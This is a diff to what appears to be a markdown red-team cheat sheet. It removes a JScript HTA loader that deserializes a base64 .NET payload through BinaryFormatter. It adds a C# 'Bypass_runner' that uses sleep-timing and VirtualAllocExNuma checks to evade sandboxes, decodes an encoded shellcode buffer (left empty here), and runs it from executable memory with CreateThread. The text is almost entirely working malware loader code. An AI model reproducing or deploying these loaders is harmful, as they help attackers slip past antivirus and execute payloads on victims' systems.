@@ -95,51 +95,6 @@ DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
 
 #### Method 1:
 ```javascript
-<head> 
-<script language="JScript"> 
-function setversion() { 
-new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319'; } 
-function debug(s) {} 
-function base64ToStream(b) { 
-			var enc = new ActiveXObject("System.Text.ASCIIEncoding"); 				
-			var length = enc.GetByteCount_2(b); 
-			var ba = enc.GetBytes_4(b); 
-			var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform"); ba = transform.TransformFinalBlock(ba, 0, length); 
-			var ms = new ActiveXObject("System.IO.MemoryStream"); 
-			ms.Write(ba, 0, (length / 4) * 3); 
-			ms.Position = 0; 
-			return ms; 
-}
-			
-var serialized_obj = "REPLACE_HERE";
-			
-var entry_class = 'TestClass'; 
-try { 
-			setversion(); 
-			var stm = base64ToStream(serialized_obj); 
-			var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter'); 
-			var al = new ActiveXObject('System.Collections.ArrayList'); 
-			var d = fmt.Deserialize_2(stm); 
-			al.Add(undefined); 
-			var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
-			
-} catch (e) {
-			debug(e.message);
-} 
-</script> 
-</head>
-<body> 
-<script language="JScript"> 
-self.close(); 
-</script> 
-</body> 
-</html>
-```
-<br>
-<br>
-
-#### Method 2:
-```
 <head>
 <script language="JScript">
 var shell = new ActiveXObject("WScript.Shell");
@@ -160,6 +115,76 @@ self.close();
 
 # CSharp
 
+## Bypass_runner
+```csharp
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Net;
+using System.Text;
+using System.Threading;
+namespace Met
+{
+class Program
+{
+[DllImport("kernel32.dll", SetLastError = true, ExactSpelling =
+true)]
+static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint
+flAllocationType, uint flProtect);
+[DllImport("kernel32.dll")]
+static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint
+dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint
+dwCreationFlags, IntPtr lpThreadId);
+[DllImport("kernel32.dll")]
+static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32
+dwMilliseconds);
+[DllImport("kernel32.dll", SetLastError = true, ExactSpelling =
+true)]
+static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr
+lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32
+nndPreferred);
+[DllImport("kernel32.dll")]
+static extern void Sleep(uint dwMilliseconds);
+[DllImport("kernel32.dll")]
+static extern IntPtr GetCurrentProcess();
+static void Main(string[] args)
+{
+//Sleep timer bypass
+DateTime t1 = DateTime.Now;
+Sleep(2000);
+double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+if (t2 < 1.5) {
+return;
+}
+Console.WriteLine("Sleep timer bypassed!");
+//Non emulated api's
+IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(),
+IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
+if (mem == null) {
+return;
+}
+Console.WriteLine("API Emulation done!");
+byte[] buf = new byte[770] { };
+byte[] encoded = new byte[buf.Length];
+for (int i = 0; i < buf.Length; i++)
+{
+encoded[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
+}
+buf = encoded;
+Console.WriteLine("Cipher decrypted!");
+int size = buf.Length;
+IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
+Console.WriteLine("Allocation Complete!");
+Marshal.Copy(buf, 0, addr, size);
+Console.WriteLine("Copy done!");
+IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
+IntPtr.Zero, 0, IntPtr.Zero);
+Console.WriteLine("Thread Created");
+WaitForSingleObject(hThread, 0xFFFFFFFF);
+Console.WriteLine("Reached End");
+}
+}
+}
 
 ## Meterpreter_FUD_DLL
 
